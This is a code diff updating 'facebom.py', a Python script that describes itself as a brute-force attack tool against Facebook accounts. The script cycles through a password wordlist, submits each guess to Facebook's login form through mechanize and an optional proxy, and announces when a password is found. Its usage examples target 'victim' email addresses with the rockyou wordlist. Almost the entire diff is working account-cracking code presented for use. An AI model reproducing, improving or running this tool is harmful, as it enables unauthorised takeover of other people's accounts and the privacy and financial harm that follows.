@@ -6,14 +6,22 @@
 #    JOB : Brute Force Attack On Facebook Accounts
 #Codedby : Oseid Aldary
 ######################
+modules = ["requests", "mechanize"]
 try:
  ##--------------------- Import Libraries --------------------##
  import socket,time,os,optparse,mechanize,random,re,requests  ##
  ##-----------------------------------------------------------##
 except ImportError as e:
-        module = e.message[16:]
-        print("[!] ImportError: ["+module+"] Module Is Missed \n[*] Please Install it Using this command> [ pip install "+module+" ]")
-        exit(1)
+	no = 1
+	for module in modules:
+		if module in e.message:
+			no = 0
+			print("[!] ImportError: ["+module+"] Module Is Missed \n[*] Please Install it Using this command> [ pip install "+module+" ]")
+			break
+	if no ==1:
+		print("[!] Error: "+e.message+" !!!")
+		exit(1)
+
 os.system("cls||clear")
 
 ## COLORS ###############
@@ -37,8 +45,8 @@ def cnet():                                       #
 
 #### Check Proxy ####
 def cpro(ip,port=None):
-	proxy = 'https://{}:8080'.format(ip) if port ==None else 'https://{}:{}'.format(ip,port)
-	proxies = {'http': proxy, 'https': proxy}
+	proxy = '{}:8080'.format(ip) if port ==None else '{}:{}'.format(ip,port)
+	proxies = {'https': "https://"+proxy, 'http': "http://"+proxy}
 	try:
 		r = requests.get('https://www.wikipedia.org',proxies=proxies, timeout=5)
 		return_proxy = r.headers['X-Client-IP']
@@ -74,10 +82,7 @@ def FBOM(username, wordlist, proxy=None):
     if cnet() !=True:
         print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Please Check Your Intenrnet Connection "+rd+"!!!"+wi)
         exit(1)
-    try:
-        test = open(wordlist, "r")
-        test.close()
-    except IOError:
+    if not os.path.isfile(wordlist):
         print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" No Such File: [ "+rd+str(wordlist)+yl+" ] "+rd+"!!!"+wi)
         exit(1)
     if proxy !=None:
@@ -94,17 +99,17 @@ def FBOM(username, wordlist, proxy=None):
                 	else:
                 		print(rd+"["+yl+"Connection Failed"+rd+"] !!!"+wi)
                 		useproxy = False
-                		print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid HTTPS Proxy["+rd+str(proxy)+yl+"]"+rd+" !!!"+wi)
+                		print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid HTTP/S Proxy["+rd+str(proxy)+yl+"]"+rd+" !!!"+wi)
                 		exit(1)
             else:
                 useproxy = False
-                print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+"Invalid IPv4 Proxy["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
+                print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+"Invalid IPv4 ["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
                 exit(1)
         else:
             proxy,port = proxy.split(":")[0],proxy.split(":")[1]
             if proxy.count(".") ==3:
-		if not port.isdigit() or int(port) <0 or int(port) > 65535:
-			print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid Proxy Port["+port+"] "+rd+"!!!"+wi)
+		if not port.isdigit() or int(port) <1 or int(port) > 65535:
+			print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid Port ["+rd+port+yl+"] Should Be In Range("+wi+"0-65535"+yl+")"+rd+"!!!"+wi)
 			exit(1)
 			      
                 if cpro(proxy, port=port) == True:
@@ -113,11 +118,11 @@ def FBOM(username, wordlist, proxy=None):
                 else:
                     print(rd+"["+yl+"Connection Failed"+rd+"] !!!"+wi)
                     useproxy = False
-                    print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid HTTPS Proxy["+rd+str(proxy)+yl+"]"+rd+" !!!"+wi)
+                    print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid HTTP/S Proxy["+rd+str(proxy)+yl+"]"+rd+" !!!"+wi)
                     exit(1)
             else:
                 useproxy = False
-                print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid IPv4 Proxy["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
+                print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid IPv4 ["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
                 exit(1)
     else:
         useproxy = False
@@ -134,9 +139,9 @@ def FBOM(username, wordlist, proxy=None):
 [>] Target      :> """+wi+username+gr+"""
 [>] Wordlist    :> """+yl+str(wordlist)+gr+"""
 [>] ProxyStatus :> """+str(proxystatus)+gr+"""      
-================================="""+wi+"""
-[~] """+yl+"""Brute"""+rd+"""ForceATTACK: """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
-=================================
+=================================="""+wi+"""
+[~] """+yl+"""Brute"""+rd+""" ForceATTACK: """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
+==================================
 """)
     loop = 1
     br=mechanize.Browser()
@@ -145,41 +150,45 @@ def FBOM(username, wordlist, proxy=None):
         br.set_proxies({'http':useproxy, 'https:':useproxy})
     user_agent = useragent()
     br.addheaders=[('User-agent',user_agent)]
-    wfile = open(wordlist, "r")
-    for passwd in wfile:
-        if not passwd.strip():continue
-        passwd = passwd.strip()
-        try:
-            print(wi+"["+yl+str(loop)+wi+"]~["+yl+"~"+wi+"] Trying Password:>[ "+yl+str(passwd)+wi)
-            br.open("https://facebook.com")
-            br.select_form(nr=0)
-            br.form["email"]=username
-            br.form["pass"]=passwd
-            br.method="POST"
-            if "home_icon" in br.submit().get_data():
-                print(wi+"==> Login"+gr+" Success\n")
-                print(wi+"========================="+"="*len(passwd))
-                print(wi+"["+gr+"+"+wi+"] Password "+gr+"Found:"+wi+">>>>[ "+gr+"{}".format(passwd))
-                print(wi+"========================="+"="*len(passwd))
-                break
-            else:
-                print(yl+"==> Login"+rd+" Failed\n")
-            loop+=1
-        except KeyboardInterrupt:
-            print(rd+"\n["+yl+"!"+rd+"][CTRL+C]..."+yl+"Exiting"+wi)
-            time.sleep(1.5)
-            wfile.close()
-            exit(1)
-        except EOFError:
-            print(rd+"\n["+yl+"!"+rd+"][CTRL+C]..."+yl+"Exiting"+wi)
-            time.sleep(1.5)
-            wfile.close()
-            exit(1)
-        except Exception, e:
-            print(rd+"\n["+yl+"!"+rd+"] Error: "+yl+str(e)+wi)
-            wfile.close()
-            exit(1)
-            
+    issuccess = 0
+    with open(wordlist) as wfile:
+    	for passwd in wfile:
+    		if not passwd.strip():continue
+    		passwd = passwd.strip()
+    		try:
+    			print(wi+"["+yl+str(loop)+wi+"]~["+yl+"~"+wi+"] Trying Password:>[ "+yl+str(passwd)+wi)
+    			br.open("https://facebook.com")
+    			br.select_form(nr=0)
+    			br.form["email"]=username
+    			br.form["pass"]=passwd
+    			br.method="POST"
+    			if "home_icon" in br.submit().get_data():
+    				issuccess = 1
+    				print(wi+"==> Login"+gr+" Success\n")
+    				print(wi+"========================="+"="*len(passwd))
+    				print(wi+"["+gr+"+"+wi+"] Password "+gr+"Found:"+wi+">>>>[ "+gr+"{}".format(passwd))
+    				print(wi+"========================="+"="*len(passwd))
+    				break
+    			else:
+    				print(yl+"==> Login"+rd+" Failed\n")
+    			loop+=1
+    		except (KeyboardInterrupt,EOFError):
+    			print(rd+"\n["+yl+"!"+rd+"][CTRL+C]..."+yl+"Exiting"+wi)
+    			time.sleep(1.5)
+    			wfile.close()
+    			issuccess = 2
+    			break
+    		except Exception, e:
+    			issuccess = 2
+    			print(rd+"\n["+yl+"!"+rd+"] Error: "+yl+str(e)+wi)
+    			time.sleep(0.60)
+    			wfile.close()
+    			break
+    if issuccess ==0:
+    	print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"I Can't Find The Correct Password In [ "+yl+wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
+    	print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Another Wordlist File "+gr+":)"+wi)
+    	exit(1)
+
 parse = optparse.OptionParser(wi+"""
 Usage: python ./facebom.py [OPTIONS...]
 -------------
@@ -199,7 +208,7 @@ Examples:
      |--------
      | python facebom.py -t victim@gmail.com -w /usr/share/wordlists/rockyou.txt
      |--------
-     | python Facebom.py -t 100001013078780 -w C:\Users\Me\Desktop\wordlist.txt
+     | python Facebom.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
      |--------
      | python facebom.py -t victim@hotmail.com -w D:\\wordlist.txt -p 35.236.37.121 
      |-------- 
@@ -232,8 +241,9 @@ def Main():
    else:
        print(parse.usage)
        exit(1)
+
 if __name__=='__main__':
-  Main()
+	Main()
 
 ##############################################################
 #####################                #########################
